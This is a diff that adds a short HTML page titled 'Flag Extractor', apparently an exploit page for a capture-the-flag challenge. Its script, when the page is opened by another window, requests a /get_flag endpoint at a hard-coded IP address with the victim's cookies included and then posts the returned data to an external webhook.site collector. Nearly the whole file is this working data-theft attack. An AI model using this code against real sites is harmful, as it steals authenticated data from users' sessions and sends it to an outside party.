@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag Extractor</title>
+</head>
+<body>
+    <script>
+        // Check if we were opened by window.open()
+        if (window.opener) {
+            // Try to access the parent window's origin
+            try {
+                // Make request to /get_flag from parent's context
+                fetch('http://34.134.162.213:17001/get_flag', {
+                    method: 'GET',
+                    credentials: 'include'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Send flag to your server
+                    fetch('https://webhook.site/110d1227-1b51-4c79-8576-31c177b7a1e1', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data)
+                    });
+                })
+                .catch(err => console.error(err));
+            } catch (e) {
+                console.error('Access denied:', e);
+            }
+        }
+    </script>
+</body>
+</html>
